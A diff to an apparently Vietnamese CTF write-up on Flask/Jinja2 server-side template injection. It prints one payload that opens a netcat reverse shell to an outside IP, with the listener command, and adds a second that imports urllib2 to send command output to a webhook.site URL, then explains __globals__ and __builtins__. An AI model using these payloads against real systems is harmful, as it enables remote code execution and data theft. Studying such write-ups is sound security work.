@@ -63,4 +63,29 @@ Sau khi bypass được check role,ta sẽ khai thác SSTI để tạo revert sh
 Payload: 
 <a>`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('nc 172.26.97.248 9999 -e /bin/bash').read() }}
 `</a> <br>
-Lắng nghe port 9999 : `nc -lvnp 9999`
+Lắng nghe port 9999 : `nc -lvnp 9999` <br>
+Cách 2: <br>
+Payload: <br>
+<a>
+```
+{
+  "template": "{{ url_for.__globals__['__builtins__']['__import__']('urllib2').urlopen('https://webhook.site/0139531b-9559-42d0-a71a-b43e039822c2/?flag=' + url_for.__globals__['os'].popen('ls').read()) }}"
+}
+```
+</a> 
+Có : <br>
+<p> url_for :  Đây là một hàm phổ biến trong Flask dùng để tạo ra URL cho một endpoint cụ thể. </p>
+<p> __globals__ : Đây là một thuộc tính của các hàm trong Python, chứa các biến toàn cục có sẵn trong phạm vi hàm đó. Khi gọi url_for.__globals__, ta truy cập được toàn bộ không gian toàn cục của Flask,
+bao gồm các hàm, biến và module. </p>
+<p> ['__builtins__'] : Đây là một mục trong __globals__, chứa các hàm và biến dựng sẵn của Python. </p>
+<p>Trong Python, module builtins chứa rất nhiều hàm dựng sẵn. Các hàm này có thể được sử dụng mà không cần import vì chúng được tích hợp sẵn trong môi trường Python. <br>
+Dưới đây là danh sách các hàm phổ biến trong builtins: </p>
+        Hàm nhập xuất: <br>
+print() :In dữ liệu ra màn hình. <br>
+input() : Lấy dữ liệu đầu vào từ người dùng. <br>
+open()  : Mở file. <br>
+Hàm đặc biệt cho import và unload module: <br>
+__import__() :Cho phép import một module mới hoặc lấy lại module đã được import vào bộ nhớ. <br>
+Cách dùng __import__('module_name') có thể thay thế cho câu lệnh import module_name. <br>
+        
+      
